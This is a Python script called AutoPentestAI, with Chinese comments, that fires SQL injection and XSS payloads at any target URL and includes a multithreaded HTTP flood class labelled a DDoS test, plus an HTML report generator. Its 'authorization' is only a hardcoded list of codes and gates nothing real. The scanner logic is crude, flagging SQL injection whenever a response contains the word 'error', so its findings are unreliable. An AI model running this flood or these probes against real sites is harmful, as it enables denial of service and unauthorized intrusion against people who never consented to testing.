#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AutoPentestAI - 零依赖渗透测试工具 (仅使用Python标准库)
功能：
1. 基础漏洞扫描 (SQLi/XSS)
2. 简易DDoS压力测试
3. HTML报告生成
"""

import argparse
import threading
import time
import urllib.request
import urllib.error
from urllib.parse import urlparse, urlencode
from datetime import datetime
from html import escape

# ==================== 配置部分 ====================
AUTH_CODES = {"AUTH123", "PENTEST2025"}  # 合法授权码
SQLI_PAYLOADS = ["' OR '1'='1", "admin'--", "1' ORDER BY 1--"]
XSS_PAYLOADS = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"]
USER_AGENT = "AutoPentestAI/1.0"
# ================================================

class VulnerabilityScanner:
    """使用urllib实现的漏洞扫描模块"""
    
    @staticmethod
    def _http_request(url: str, data=None, method="GET") -> str:
        """通用的HTTP请求函数"""
        headers = {"User-Agent": USER_AGENT}
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            with urllib.request.urlopen(req, timeout=5) as response:
                return response.read().decode('utf-8', errors='ignore')
        except urllib.error.URLError as e:
            print(f"[!] 请求失败: {e.reason}")
            return ""

    @staticmethod
    def check_sqli(url: str) -> list:
        """检测SQL注入漏洞"""
        results = []
        for payload in SQLI_PAYLOADS:
            test_url = f"{url}?id={urllib.parse.quote(payload)}"
            response = VulnerabilityScanner._http_request(test_url)
            if "SQL syntax" in response or "error" in response.lower():
                results.append({
                    "type": "SQL注入",
                    "payload": payload,
                    "confidence": "高"
                })
        return results

    @staticmethod
    def check_xss(url: str) -> list:
        """检测XSS漏洞"""
        results = []
        for payload in XSS_PAYLOADS:
            post_data = urllib.parse.urlencode({"input": payload}).encode()
            response = VulnerabilityScanner._http_request(url, data=post_data, method="POST")
            if payload in response:
                results.append({
                    "type": "跨站脚本(XSS)",
                    "payload": payload,
                    "confidence": "中"
                })
        return results

    def run_scan(self, target: str) -> list:
        """执行完整扫描"""
        vulns = []
        vulns.extend(self.check_sqli(target))
        vulns.extend(self.check_xss(target))
        return vulns

class DDOSTester:
    """使用threading+urllib实现的DDoS测试"""
    
    def __init__(self, target: str):
        self.target = target
        self._stop_flag = False

    def _attack(self):
        """单个攻击线程"""
        headers = {"User-Agent": USER_AGENT}
        req = urllib.request.Request(self.target, headers=headers)
        while not self._stop_flag:
            try:
                with urllib.request.urlopen(req, timeout=1) as _:
                    pass
            except:
                continue

    def execute(self, threads: int = 5, duration: int = 10) -> str:
        """启动DDoS测试"""
        try:
            for _ in range(threads):
                t = threading.Thread(target=self._attack)
                t.daemon = True
                t.start()
            
            time.sleep(duration)
            self._stop_flag = True
            return f"[+] DDoS测试完成 ({threads}线程/{duration}秒)"
        except Exception as e:
            return f"[!] DDoS错误: {str(e)}"

def generate_report(target: str, vulnerabilities: list):
    """生成HTML报告（纯标准库实现）"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    filename = f"report_{target.replace('://', '_')}_{timestamp.replace(':', '-')}.html"
    
    html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>AutoPentestAI 报告 - {escape(target)}</title>
    <style>
        body {{ font-family: Arial; margin: 20px; }}
        .vuln {{ color: #d9534f; margin-bottom: 15px; }}
        .payload {{ background: #f7f7f9; padding: 5px; }}
    </style>
</head>
<body>
    <h1>渗透测试报告</h1>
    <p><strong>目标:</strong> {escape(target)}</p>
    <p><strong>时间:</strong> {escape(timestamp)}</p>
    <h2>发现的漏洞:</h2>
    <ul>
    """
    
    for vuln in vulnerabilities:
        html_content += f"""
        <li class="vuln">
            <strong>{escape(vuln['type'])}</strong> (置信度: {escape(vuln['confidence'])})<br>
            <span class="payload">Payload: {escape(vuln['payload'])}</span>
        </li>
        """
    
    html_content += """
    </ul>
</body>
</html>
    """
    
    with open(filename, "w", encoding="utf-8") as f:
        f.write(html_content)
    print(f"[+] 报告已保存到 {filename}")

def validate_auth(auth_code: str) -> bool:
    """验证授权码"""
    return auth_code in AUTH_CODES

def main():
    parser = argparse.ArgumentParser(
        description="AutoPentestAI - 零依赖渗透测试工具",
        epilog="法律要求: 必须获得书面授权方可使用"
    )
    parser.add_argument("-t", "--target", required=True, help="目标URL (例如: http://example.com)")
    parser.add_argument("-m", "--mode", choices=["scan", "ddos", "full"], default="scan", 
                       help="测试模式: scan=仅扫描, ddos=仅压力测试, full=完整测试")
    parser.add_argument("-a", "--auth", required=True, help="授权码")
    
    args = parser.parse_args()
    
    if not validate_auth(args.auth):
        print("[!] 错误: 无效的授权码")
        return

    print(f"[*] 开始测试: {args.target} (模式: {args.mode})")
    
    vulns = []
    if args.mode in ["scan", "full"]:
        scanner = VulnerabilityScanner()
        vulns = scanner.run_scan(args.target)
        print(f"[+] 发现 {len(vulns)} 个漏洞")
        for vuln in vulns:
            print(f"  - {vuln['type']} (置信度: {vuln['confidence']})")

    if args.mode in ["ddos", "full"]:
        tester = DDOSTester(args.target)
        print(tester.execute(threads=10, duration=10))

    if args.mode == "full" and vulns:
        generate_report(args.target, vulns)

if __name__ == "__main__":
    main()